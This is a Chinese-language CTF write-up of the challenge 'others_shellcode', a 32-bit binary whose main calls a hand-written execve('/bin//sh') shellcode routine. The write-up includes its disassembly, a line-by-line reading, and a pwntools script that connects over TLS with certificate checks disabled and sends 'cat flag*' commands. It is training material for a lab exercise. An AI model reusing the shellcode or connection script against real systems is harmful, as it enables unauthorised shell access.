# Speedrun：others_shellcode

> 题型：网络交互 / 白给 Shell（execve shellcode）  
> 目标：程序正常逻辑直接 `execve("/bin//sh")`，连上后执行命令即可  
> 核心：没有输入点、没有偏移、没有 leak；PIE 是干扰项

---

## 0. 一句话结论

```text
main:
  call getShell

getShell:
  xor edx, edx
  push edx
  push 0x68732f2f        ; "//sh"
  push 0x6e69622f        ; "/bin"
  mov ebx, esp           ; ebx = "/bin//sh"
  push edx
  push ebx
  mov ecx, esp           ; argv = ["/bin//sh", NULL]
  mov eax, -1
  sub eax, -12           ; eax = 11 = SYS_execve
  int 0x80

没有 read / gets / scanf，程序自己给 shell。
利用 = 连接 + 发命令。
```

`PIE enabled`、`NX enabled` 都不影响：代码本来就在执行 shellcode，不需要覆盖任何地址。

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn Writeups/network_interaction_free_shell'

file others_shellcode
checksec --file=others_shellcode
nm -n others_shellcode | grep -E ' (main|getShell)$'
objdump -d -M intel others_shellcode | sed -n '/<main>:/,/^$/p'
objdump -d -M intel others_shellcode | sed -n '/<getShell>:/,/^$/p'
```

关键输出：

```text
ELF 32-bit LSB pie executable, Intel i386, dynamically linked, not stripped
Partial RELRO
No canary found
NX enabled
PIE enabled
Not stripped

00000550 T getShell
0000057d T main
```

读法：

| 观察 | 结论 |
| --- | --- |
| 32 位 i386 | 使用 `int 0x80` 系统调用 |
| PIE enabled | 但 `main` 直接 `call getShell`，不需要地址 |
| NX enabled | shellcode 在 `.text` 里，不在栈上，NX 不拦 |
| No canary | 没有栈溢出，canary 无关 |
| `getShell` 内 `int 0x80` | 不是 `system@plt`，是手写 `execve` |
| 没有输入函数 | 不存在内存破坏点 |

### 1.1 `main`

```asm
0000057d <main>:
 57d: push   ebp
 57e: mov    ebp,esp
 580: call   596 <__x86.get_pc_thunk.ax>
 585: add    eax,0x1a7b
 58a: call   550 <getShell>
 58f: mov    eax,0x0
 594: pop    ebp
 595: ret
```

等价 C：

```c
int main(void) {
    getShell();
    return 0;
}
```

`getShell` 没有被条件分支保护，`main` 无条件调用它。

### 1.2 `getShell`

```asm
00000550 <getShell>:
 550: push   ebp
 551: mov    ebp,esp
 553: call   596 <__x86.get_pc_thunk.ax>
 558: add    eax,0x1aa8
 55d: xor    edx,edx
 55f: push   edx
 560: push   0x68732f2f        ; "//sh"
 565: push   0x6e69622f        ; "/bin"
 56a: mov    ebx,esp           ; "/bin//sh"
 56c: push   edx
 56d: push   ebx
 56e: mov    ecx,esp           ; argv
 570: mov    eax,0xffffffff
 575: sub    eax,0xfffffff4
 578: int    0x80
 57a: nop
 57b: pop    ebp
 57c: ret
```

逐句：

```text
edx = 0
push 0
push "//sh"
push "/bin"
ebx = esp                  -> "/bin//sh"
push 0                     -> argv[1] = NULL
push ebx                   -> argv[0] = "/bin//sh"
ecx = esp                  -> argv
eax = -1; eax -= -12       -> eax = 11 = SYS_execve
int 0x80                   -> execve("/bin//sh", argv, NULL)
```

`"/bin//sh"` 和 `"/bin/sh"` 等价；多一个 `/` 是为了 4 字节对齐压栈。

---

## 2. 利用方式

### 2.1 本地直接交互

```bash
cd '/home/yfhd5/Pwn Writeups/network_interaction_free_shell'
printf 'echo SHELL_OK; id; exit\n' | ./others_shellcode
```

没有 i386 loader 时：

```bash
I386_LD=/tmp/libc32/root/usr/lib/i386-linux-gnu/ld-linux.so.2 \
I386_LIBPATH=/tmp/libc32/root/usr/lib/i386-linux-gnu \
./others_shellcode
```

### 2.2 远程

```python
from pwn import *
import ssl

HOST = "target"
PORT = 9999

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

p = remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)
p.interactive()
```

进入后：

```text
ls -la
cat flag*
cat /flag*
```

---

## 3. 完整 exp

```python
from pwn import *
import os
import re
import ssl
import time

context.arch = "i386"
context.log_level = "info"

BIN = "./others_shellcode"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))


def start():
    if args.LOCAL:
        ld = os.getenv("I386_LD")
        libpath = os.getenv("I386_LIBPATH")
        if ld:
            return process([ld, "--library-path", libpath, BIN])
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: "
            "python 17_others_shellcode_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def exploit():
    p = start()

    # main() calls getShell(), which is execve("/bin/sh", ...). No input is
    # needed; the "exploit" is simply interacting with the shell.
    time.sleep(0.2)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] flag not found, raw output above")


if __name__ == "__main__":
    exploit()
```

本地验证：

```bash
cd '/home/yfhd5/Pwn Writeups/network_interaction_free_shell'
I386_LD=/tmp/libc32/root/usr/lib/i386-linux-gnu/ld-linux.so.2 \
I386_LIBPATH=/tmp/libc32/root/usr/lib/i386-linux-gnu \
../.venv/bin/python 17_others_shellcode_exp.py LOCAL
```

预期：

```text
__PWNED__
```

远程：

```bash
HOST=... PORT=... python 17_others_shellcode_exp.py
# CTF² 平台要 TLS 时设置 SSL=1
```

---

## 4. 交互坑

1. **不要找偏移**  
   程序没有 `read` / `gets` / `scanf` 输入，不存在栈溢出；找 offset 是浪费时间。

2. **PIE 是干扰项**  
   `main` 直接 `call getShell`，运行时地址由 PIE 决定，但不需要你填任何地址。

3. **NX 也是干扰项**  
   shellcode 在 `.text` 段，不是栈上的 shellcode；NX 只阻止执行栈/堆。

4. **不是 `system("/bin/sh")`**  
   没有 `system@plt`，是 `int 0x80` 的 `execve`；语义一样，都是给 shell。

5. **本地 32 位 loader**  
   没有 `ld-linux.so.2` 时 `process(BIN)` 会 `ENOENT`；用 `I386_LD` / `I386_LIBPATH`。

6. **TLS**  
   CTF² 平台通常要 `ssl=True`，并关闭证书校验；普通 `nc` 可能直接 EOF。

7. **不要等 banner**  
   程序没有任何提示，连上就是 shell；直接发命令。

8. **flag 路径未知**  
   先 `ls -la`，再 `cat flag*`、`cat /flag*`。

---

## 5. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `checksec` + `nm`：32 位 PIE、No canary、`getShell` |
| 0:20–0:40 | `objdump main/getShell`：直接 `execve("/bin//sh")` |
| 0:40–0:55 | 确认没有输入点，判定为网络交互题 |
| 0:55–1:15 | 本地 `printf ... | ./others_shellcode` 验证 |
| 1:15–1:35 | 远程 TLS 连接，`ls`、`cat flag*` |
| 1:35–1:50 | 正则提取 flag |

---

## 6. 题型识别卡

```text
32 位 + PIE + NX + No canary
+ main 无输入，直接 call getShell
+ getShell 内 int 0x80 / execve("/bin//sh")
= 白给 shell，连上交互即可
```

一句话：**看到 `int 0x80` + `execve` 就不要再逆了；这题只需要连接、`ls`、`cat flag*`。**

